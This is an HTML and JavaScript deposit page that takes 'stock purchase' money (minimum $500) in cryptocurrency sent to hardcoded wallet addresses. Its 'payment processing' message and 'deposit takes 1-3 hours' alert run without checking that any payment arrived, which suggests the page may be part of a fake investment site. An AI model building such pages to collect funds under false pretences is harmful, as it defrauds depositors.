<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Deposit</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --line: rgba(255,255,255,.08);
      --text: #e6e9ef;
      --muted: #93a0b3;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body { margin:0; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, 'Helvetica Neue', Arial; color: var(--text); background: radial-gradient(120% 120% at 0% 0%, rgba(109,94,252,0.12) 0%, rgba(109,94,252,0) 40%), linear-gradient(180deg, #0a0f17, #06090f 70%); }
    .top { height:56px; display:flex; align-items:center; gap:10px; padding:0 12px; border-bottom:1px solid var(--line); background: rgba(10,14,22,.6); backdrop-filter: blur(6px); position: sticky; top:0; z-index:5; }
    .back { width:32px; height:32px; border-radius:8px; border:1px solid var(--line); display:grid; place-items:center; color:#9aa4b2; background:transparent; cursor:pointer; }
    .title { font-weight:800; }
    .frame { min-height: calc(100% - 56px); padding: 28px 18px 56px; display:flex; justify-content:center; }
    .container { width: 960px; max-width: 96vw; }

    .panel { background: #ffffff; color: #0b0f15; border-radius: 10px; padding: 16px; width: 640px; max-width: 100%; margin: 0 auto; }
    .notice { display:flex; gap:10px; align-items:flex-start; padding:12px; border-radius:8px; background:#e8f5e9; color:#1b5e20; border:1px solid #c8e6c9; }
    .label { font-weight:700; margin: 12px 0 6px; }
    .input, .select { width:100%; padding:10px 12px; border-radius:8px; border:1px solid #d8dde6; background:#f6f7fb; color:#0b0f15; font-family: inherit; }
    .cta { margin-top: 14px; width: 100%; padding: 12px 14px; border-radius: 10px; border: none; cursor: pointer; color: white; background: linear-gradient(90deg, #1f2937, #111827); display: inline-flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; }

    .addr { margin-top: 10px; display: none; }
    .addr .field { display:grid; grid-template-columns: 1fr auto; gap:8px; align-items:center; }
    .copy { padding: 10px 12px; border-radius: 8px; border: 1px solid #d8dde6; background: #eef1f6; cursor: pointer; font-weight: 600; }

    .qr { margin-top: 12px; display: none; }
    .qr .wrap { display:flex; align-items:center; gap: 14px; }
    .qr .timer { font-weight: 700; color: #111827; background:#f1f5f9; border:1px solid #e5e7eb; padding:8px 10px; border-radius:8px; }

    .processing { display:none; margin-top: 12px; padding: 10px 12px; border-radius: 8px; background: #fff7ed; color: #7c2d12; border: 1px solid #ffedd5; font-weight: 600; }

    .section { margin-top: 26px; }
    .title2 { font-size: 26px; font-weight: 800; }
  </style>
</head>
<body>
  <div class="top">
    <button class="back" onclick="history.back()" aria-label="Back"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
    <div class="title">Deposit</div>
  </div>

  <div class="frame">
    <div class="container">
      <div class="panel">
        <div class="notice">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9v4m0 4h.01M21 12c0 4.97-4.03 9-9 9s-9-4.03-9-9 4.03-9 9-9 9 4.03 9 9z" stroke="#1b5e20" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div>
            <div style="font-weight:700;">Crypto payment details generated.</div>
            <div>Please follow the instructions below to complete your payment.</div>
          </div>
        </div>

        <div class="label">Uid</div>
        <input class="input" value="" aria-label="Uid" />

        <div class="label">Amount ($)</div>
        <input class="input" id="amountInput" type="text" placeholder="Enter amount in USD" aria-label="Amount" />
        <div id="minAmountNote" class="note" style="color: #ef4444; font-weight: 600; margin-top: 4px;">Minimum stock purchase amount: $500</div>

        <div class="label">Payment Methods</div>
        <select class="select" id="cryptoSelect" aria-label="Payment method">
          <option value="" selected>Select a Payment Method</option>
          <option value="BTC">BTC</option>
          <option value="ETH">ETH</option>
          <option value="USDT-TRC20">USDT-TRC20</option>
          <option value="LTC">LTC</option>
          <option value="XRP">XRP</option>
          <option value="ADA">ADA</option>
          <option value="DOT">DOT</option>
          <option value="BNB">BNB</option>
          <option value="SOL">SOL</option>
          <option value="LINK">LINK</option>
          <option value="XLM">XLM</option>
          <option value="DOGE">DOGE</option>
          <option value="TRX">TRX</option>
        </select>

        <div class="addr" id="addressBlock">
          <div class="label" id="addressLabel">Deposit Address</div>
          <div class="field">
            <input class="input" id="addressInput" readonly />
            <button class="copy" type="button" onclick="copyAddress()">Copy</button>
          </div>
        </div>

        <div class="qr" id="qrBlock">
          <div class="label">Scan QR (expires in <span id="qrTimer">30:00</span>)</div>
          <div class="wrap">
            <img id="qrImage" alt="QR code" width="140" height="140" style="border-radius:8px; border:1px solid #e5e7eb; background:#fff;" />
            <div style="font-size:12px; color:#374151;">
              Scan with your wallet app to send to the selected address.
              <div id="qrStatus" style="margin-top:6px; font-weight:600;"></div>
            </div>
          </div>
        </div>

        <div id="processingMsg" class="processing">Payment processing… follow your wallet instructions.</div>

        <button class="cta" type="button" onclick="proceedDeposit()">Proceed</button>
      </div>

      <div style="margin-top:18px;"><a style="color:inherit; text-decoration:none;" href="database.html">← Back to Database</a></div>
    </div>
  </div>

  <script>
    // Add number-only validation to amount input
    document.addEventListener('DOMContentLoaded', function() {
      const amountInput = document.getElementById('amountInput');
      if (amountInput) {
        amountInput.addEventListener('input', function(e) {
          // Remove any non-numeric characters except decimal point
          e.target.value = e.target.value.replace(/[^0-9.]/g, '');
          // Ensure only one decimal point
          const parts = e.target.value.split('.');
          if (parts.length > 2) {
            e.target.value = parts[0] + '.' + parts.slice(1).join('');
          }
        });
        
        amountInput.addEventListener('keypress', function(e) {
          // Allow: backspace, delete, tab, escape, enter, decimal point
          if ([8, 9, 27, 13, 46].indexOf(e.keyCode) !== -1 ||
              // Allow: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
              (e.keyCode === 65 && e.ctrlKey === true) ||
              (e.keyCode === 67 && e.ctrlKey === true) ||
              (e.keyCode === 86 && e.ctrlKey === true) ||
              (e.keyCode === 88 && e.ctrlKey === true) ||
              // Allow: home, end, left, right
              (e.keyCode >= 35 && e.keyCode <= 39)) {
            return;
          }
          // Ensure that it is a number and stop the keypress
          if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105) && e.keyCode !== 190) {
            e.preventDefault();
          }
        });
      }
    });

    const addresses = {
      BTC: "bc1qe7karlljpedapdd0wuv3t59len60ctfgacsn5k",
      ETH: "0xb85F210dc6406580e2C01E3bae28005e2c38b846",
      "USDT-TRC20": "TDhTHhVXxkbwo7pQg5vXkE8RNvWnYb3kTr",
      LTC: "ltc1qdgw9hz4ypw3rkllgxcz4gd53lcyr5sq3m8x2p0",
      XRP: "rQfhG8YMSQd6XAMrmqasRzNtWqq1LjzXjE",
      ADA: "addr1qx98xzlufdmwp68ehz0z7hg4e8c3pe6n60t2pury943nvy8w92693a8yv5xvyl444mr976e2m8uunacgk2npczd340dq8gh3n6",
      DOT: "12MdhoMvRhjkizsxK7nobEi55ssGgi9iAg67rRQk2Ybn2gSi",
      BNB: "0xb85F210dc6406580e2C01E3bae28005e2c38b846",
      SOL: "268wvq7gYBSLb5EQfVX65LwYTteZ9TU8cUeHQxDkmvN9",
      LINK: "0xb85F210dc6406580e2C01E3bae28005e2c38b846",
      XLM: "GDE4TLOWNHYRBOXFBUC53MD5JTO3QQIPFJDHM5QW2GG6RQ2UIBCFWHHB",
      DOGE: "DH3Hj9ekCNCnhsMDuJ4AVoWZi28Ur1DpLN",
      TRX: "TDhTHhVXxkbwo7pQg5vXkE8RNvWnYb3kTr"
    };

    const selectEl = document.getElementById('cryptoSelect');
    const blockEl = document.getElementById('addressBlock');
    const inputEl = document.getElementById('addressInput');
    const labelEl = document.getElementById('addressLabel');
    const qrBlock = document.getElementById('qrBlock');
    const qrImage = document.getElementById('qrImage');
    const qrTimer = document.getElementById('qrTimer');
    const qrStatus = document.getElementById('qrStatus');
         const processingMsg = document.getElementById('processingMsg');
     let qrExpiryTs = null;
     let qrTick = null;
     let isFirstClick = true;

    selectEl.addEventListener('change', () => {
      // On currency change, only update stored address; keep UI hidden until Proceed is clicked
      const key = selectEl.value;
      if (!key || !addresses[key]) {
        blockEl.style.display = 'none';
        inputEl.value = '';
        qrBlock.style.display = 'none';
        processingMsg.style.display = 'none';
        clearInterval(qrTick);
        return;
      }
      inputEl.value = addresses[key];
      labelEl.textContent = `${key} Deposit Address`;
      blockEl.style.display = 'none';
      qrBlock.style.display = 'none';
      processingMsg.style.display = 'none';
      clearInterval(qrTick);
    });

    function copyAddress(){
      navigator.clipboard?.writeText(inputEl.value);
    }

                                                                               function proceedDeposit(){
          const asset = selectEl.value;
          const amt = document.getElementById('amountInput').value;
          const uid = document.querySelector('input[aria-label="Uid"]').value.trim();
          
          if (!uid) {
            alert('Please enter a UID first.');
            return;
          }
          
          if (!asset || !addresses[asset]) {
            alert('Please select a payment method first.');
            return;
          }
          
          if (!amt || amt <= 0) {
            alert('Please enter a valid amount.');
            return;
          }
          
          const amount = Number(amt);
          if (amount < 500) {
            alert('Minimum stock purchase amount is $500.');
            return;
          }
          
          if (isFirstClick) {
            // First click: Show wallet address and QR code
            blockEl.style.display = 'block';
            const payload = `${asset}:${addresses[asset]}`;
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(payload)}`;
            qrImage.src = qrUrl;
            qrBlock.style.display = 'block';
            qrExpiryTs = Date.now() + 30 * 60 * 1000;
            qrStatus.textContent = '';
            clearInterval(qrTick);
            qrTick = setInterval(updateTimer, 500);
            // Show processing message
            processingMsg.style.display = 'block';
            processingMsg.textContent = `Payment processing… Attempting $${amt} via ${asset}.`;
            isFirstClick = false;
          } else {
            // Second click: Show deposit message and redirect
            alert('Deposit takes 1-3 hours to reflect');
            window.location.href = 'home.html';
          }
        }

    function updateTimer(){
      const remainingMs = Math.max(0, (qrExpiryTs ?? 0) - Date.now());
      const totalSeconds = Math.floor(remainingMs / 1000);
      const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
      const ss = String(totalSeconds % 60).padStart(2, '0');
      qrTimer.textContent = `${mm}:${ss}`;
      if (remainingMs <= 0) {
        clearInterval(qrTick);
        qrStatus.textContent = 'QR expired. Reselect a currency to regenerate.';
      }
    }
  </script>
</body>
</html>
